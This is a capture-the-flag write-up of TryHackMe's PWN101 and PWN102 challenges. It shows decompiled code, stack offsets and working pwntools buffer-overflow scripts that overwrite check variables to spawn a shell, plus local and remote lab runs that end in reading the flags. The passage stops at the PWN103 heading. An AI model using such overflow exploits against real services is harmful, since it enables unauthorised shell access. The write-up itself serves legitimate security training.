### PWN101 TryHackMe

### Binary Exploitation

#### Challenge 1 = PWN101

#### Description: This should give you a start: 'AAAAAAAAAAA'

#### Basic File Checks

```
└─$ file pwn101.pwn101 
pwn101.pwn101: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd42eee3cfdffb116dfdaa750dbe4cc8af68cf43, not stripped
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/Desktop/B2B/THM/Pwn101]
└─$ checksec pwn101.pwn101 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/B2B/THM/Pwn101/pwn101.pwn101'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```
 
 
We're working with a x64 binary and it has all protections enabled except Stack Canary

I'll run it to know what it does

```
└─$ ./pwn101.pwn101 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
lol
Nah bruh, you lied me :(
She did Tomato rice instead of briyani :/
```

It receives our input and exit 

I'll decompile the binary using ghidra

Here's the main decomiled function

```

void main(void)

{
  char input [60];
  int check;
  
  check = 0x539;
  setup();
  banner();
  puts(
      "Hello!, I am going to shopping.\nMy mom told me to buy some ingredients.\nUmmm.. But I have l ow memory capacity, So I forgot most of them.\nAnyway, she is preparing Briyani for lunch, Can  you help me to buy those items :D\n"
      );
  puts("Type the required ingredients to make briyani: ");
  gets(input);
  if (check == 0x539) {
    puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
                    /* WARNING: Subroutine does not return */
    exit(0x539);
  }
  puts("Thanks, Here\'s a small gift for you <3");
  system("/bin/sh");
  return;
}
```

Looking at the code we see what it does

```
1. It stores a value 0x539 in the variable check
2. It prints out the banner and requires out input
3. It uses get() to receive our input #bug here
4. Does an if check to know if the value stored in variable check is equal to 0x539
5. If the condition is meet it exits
6. If it isn't meet we get shell
```

So the aim is to overwrite the value stored in variable check not to be equal to 0x539

Since get() is being used to receive input we can cause a buffer overflow in this binary

Here's the stack layout

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined4        Stack[-0xc]:4  check                                   XREF[2]:     00100896(W), 
                                                                                                   001008da(R)  
             undefined1[60]    Stack[-0x48]   input                                   XREF[1]:     001008c9(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:0010072d(*), 00100c7c, 

```

From the stack layout we see that our input starts at offset `0x48` and the check variable is `0xc` 

The offset between the input and check variable is `0x48 - 0xc = 0x3c`

So here's the exploit script 

```
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './pwn101.pwn101'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 0x3c
padding = "A" * offset 
check = 0xdeadbeef

# Build the payload
payload = flat([
    padding,
    check
])

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
```

So what the script does is that it overwrite the value stored in check to 0xdeadeef

Running it locally grants us shell

```
└─$ python3 exploit.py
[+] Starting local process './pwn101.pwn101': pid 18034
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
Thanks, Here's a small gift for you <3
$ ls -al
total 28
drwxr-xr-x 2 mark mark  4096 Feb 14 15:44 .
drwxr-xr-x 3 mark mark  4096 Feb 14 15:44 ..
-rw-r--r-- 1 mark mark  1032 Feb 14 15:44 exploit.py
-rwxr-xr-x 1 mark mark 12760 Feb 14 15:30 pwn101.pwn101
$ 
```

It works now i'll run it on the remote server

```
└─$ python3 exploit.py REMOTE 10.10.210.174  9001
[+] Opening connection to 10.10.210.174 on port 9001: Done
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
Thanks, Here's a small gift for you <3
$ ls -al
total 48
drwx------  3 pwn101 pwn101  4096 Feb  8  2022 .
drwxr-xr-x 12 root   root    4096 Feb  8  2022 ..
lrwxrwxrwx  1 pwn101 pwn101     9 Feb  8  2022 .bash_history -> /dev/null
-rw-r--r--  1 pwn101 pwn101   220 Apr  4  2018 .bash_logout
-rw-r--r--  1 pwn101 pwn101  3771 Apr  4  2018 .bashrc
drwxrwxr-x  3 pwn101 pwn101  4096 Feb  8  2022 .local
-rw-r--r--  1 pwn101 pwn101   807 Apr  4  2018 .profile
-rwxrwxrwx  1 pwn101 pwn101    32 Jan 28  2022 flag.txt
-rwxrwxr-x  1 pwn101 pwn101 12760 Feb  8  2022 pwn101
-rwxrwxrwx  1 pwn101 pwn101  1137 Feb  8  2022 pwn101.c
$ cat flag.txt
THM{7h4t's_4n_3zy_oveRflowwwww}
$
```

#### Challenge 2 = PWN102

#### Basic File Checks

```
└─$ file pwn102.pwn102 
pwn102.pwn102: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2612b87a7803e0a8af101dc39d860554c652d165, not stripped
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/B2B/THM/Pwn101/pwn102]
└─$ checksec pwn102.pwn102
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/B2B/THM/Pwn101/pwn102/pwn102.pwn102'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```
 
 We're working with a x64 binary which has all protections enabled except Stack Canary
 
 I'll run it to get an overview of what it does
 
 ```
 └─$ ./pwn102.pwn102 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102          

I need badf00d to fee1dead
Am I right? yes
I'm feeling dead, coz you said I need bad food :(
```

It receives our input and exit 

I'll decompile the binary using ghidra

Here's the main decomiled function

```
void main(void)

{
  undefined input [104];
  int check2;
  int check1;
  
  setup();
  banner();
  check1 = 0xbadf00d;
  check2 = L'\xfee1dead';
  printf("I need %x to %x\nAm I right? ",0xbadf00d,L'\xfee1dead');
  __isoc99_scanf(&DAT_00100b66,input);
  if ((check1 == 0xc0ff33) && (check2 == 0xc0d3)) {
    printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3);
    system("/bin/sh");
    return;
  }
  puts("I\'m feeling dead, coz you said I need bad food :(");
                    /* WARNING: Subroutine does not return */
  exit(0x539);
}
```

Looking at the code we get what it does

```
1. It stores 0xbadf00d in check1 and 0xfee1dead in check2
2. It receives our input using scanf but doesn't specify amount of bytes that should be stored in the input buffer
3. After it receives our input it does an if check to know if the value stored in check1 is equal to 0xc0ff33 and if check2 is equal to 0xc0d3
4. If the check is passed we get a shell
5. Else it exits
```

So with this we know that we're working with a variable overwrite

Here's the stack layout

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined4        Stack[-0xc]:4  check1                                  XREF[4]:     0010091a(W), 
                                                                                                   0010092b(R), 
                                                                                                   00100959(R), 
                                                                                                   0010096e(R)  
             undefined4        Stack[-0x10]:4 check2                                  XREF[4]:     00100921(W), 
                                                                                                   00100928(R), 
                                                                                                   00100962(R), 
                                                                                                   0010096b(R)  
             undefined1[104]   Stack[-0x78]   input                                   XREF[1]:     00100941(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:0010079d(*), 00100bf0, 

```

We see that:

```
1. Input starts at offset 0x78
2. Check1 variable is at offset 0xc
3. Check2 variable is at offset 0x10
```

With this we know that the offset between the input buffer and check2 is `0x68` and the offset between the check2 and check1 is `0x5c`

Here's the exploit script that overwrites the value stored in the check variables

```
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './pwn102.pwn102'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 0x68

padding = b"A" * offset
check2 = p32(0xc0d3)
check1  = p32(0xc0ff33)

payload = padding + check2 + check1

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
```

Running it locally works 

```
└─$ python3 exploit.py
[+] Starting local process './pwn102.pwn102': pid 31962
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102          

I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3
$ ls -al
total 24
drwxr-xr-x 2 mark mark 4096 Feb 14 16:37 .
drwxr-xr-x 4 mark mark 4096 Feb 14 15:49 ..
-rw-r--r-- 1 mark mark 1032 Feb 14 16:31 exploit.py
-rwxr-xr-x 1 mark mark 8720 Feb 14 15:49 pwn102.pwn102
$ 
```

Now i'll run it on the remote server

```
└─$ python3 exploit.py REMOTE 10.10.210.174 9002      
[+] Opening connection to 10.10.210.174 on port 9002: Done
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102          

I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3
$ ls -al
total 44
drwx------  3 pwn102 pwn102 4096 Feb  8  2022 .
drwxr-xr-x 12 root   root   4096 Feb  8  2022 ..
lrwxrwxrwx  1 pwn102 pwn102    9 Feb  8  2022 .bash_history -> /dev/null
-rw-r--r--  1 pwn102 pwn102  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 pwn102 pwn102 3771 Apr  4  2018 .bashrc
drwxrwxr-x  3 pwn102 pwn102 4096 Feb  8  2022 .local
-rw-r--r--  1 pwn102 pwn102  807 Apr  4  2018 .profile
-rwxrwxrwx  1 pwn102 pwn102   34 Jan 28  2022 flag.txt
-rwxrwxr-x  1 pwn102 pwn102 8720 Feb  8  2022 pwn102
-rwxrwxrwx  1 pwn102 pwn102  964 Feb  8  2022 pwn102.c
$ cat flag.txt
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
$
```

#### Challenge 3 = PWN103

#### Basic File Checks
